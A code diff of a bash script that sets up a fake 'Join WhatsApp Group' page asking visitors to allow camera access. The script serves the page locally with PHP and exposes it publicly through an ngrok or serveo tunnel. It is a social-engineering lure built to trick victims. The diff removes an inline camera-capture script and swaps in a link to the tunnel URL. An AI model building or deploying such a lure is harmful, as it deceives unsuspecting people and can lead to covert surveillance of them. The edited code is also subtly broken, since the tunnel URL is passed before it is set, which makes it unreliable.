@@ -6,7 +6,7 @@ start_php_server() {
     PHP_SERVER_PID=$!
 }
 
-# Function to start ngrok or serveo
+# Function to start ngrok or serveo and retrieve the public URL
 start_tunnel() {
     echo "Choose tunneling service:"
     echo "1. Ngrok"
@@ -16,9 +16,11 @@ start_tunnel() {
     case $tunnel_choice in
         1)
             ngrok http 8000 >/dev/null 2>&1 &
+            sleep 5 # Adjust sleep time as needed
+            ngrok_url=$(curl -s http://127.0.0.1:4040/api/tunnels | jq -r '.tunnels[0].public_url')
             ;;
         2)
-            ssh -R 80:localhost:8000 serveo.net >/dev/null 2>&1 &
+            serveo_url=$(ssh -R 80:localhost:8000 serveo.net 2>&1 | grep "https://" | awk '{print $4}')
             ;;
         *)
             echo "Invalid choice. Exiting."
@@ -27,7 +29,7 @@ start_tunnel() {
     esac
 }
 
-# Function to create fake website HTML
+# Function to create fake website HTML with updated URL
 create_fake_website() {
     # Create a directory for the fake website
     mkdir -p fake_website
@@ -36,7 +38,7 @@ create_fake_website() {
     # Create HTML file
     touch index.php
 
-    # Write HTML content to index.php
+    # Write HTML content to index.php with updated URL
     cat <<EOT > index.php
 <!DOCTYPE html>
 <html>
@@ -76,24 +78,8 @@ create_fake_website() {
     <div class="container">
         <h1>Join WhatsApp Group</h1>
         <p>Click below to allow camera access:</p>
-        <button onclick="getCameraAccess()">Allow Camera Access</button>
+        <a href="$1" class="button">Allow Camera Access</a>
     </div>
-
-    <script>
-        function getCameraAccess() {
-            // Request camera access
-            navigator.mediaDevices.getUserMedia({ video: true })
-                .then(function(stream) {
-                    var video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.autoplay = true;
-                    document.body.appendChild(video);
-                })
-                .catch(function(err) {
-                    console.error('Error accessing camera:', err);
-                });
-        }
-    </script>
 </body>
 </html>
 EOT
@@ -102,21 +88,17 @@ EOT
 # Main function
 main() {
     # Create fake website
-    create_fake_website
+    create_fake_website "$1"
 
     # Start PHP server
     start_php_server
 
-    # Wait for PHP server to start
-    sleep 1
-
-    # Start ngrok or serveo
+    # Start ngrok or serveo and retrieve public URL
     start_tunnel
 
     # Cleanup: stop PHP server
     trap "kill $PHP_SERVER_PID" EXIT
 }
 
-# Run main function
-main
-
+# Run main function with ngrok/serveo URL as argument
+main "$ngrok_url"   # Use ngrok_url or serveo_url based on the selected tunneling service
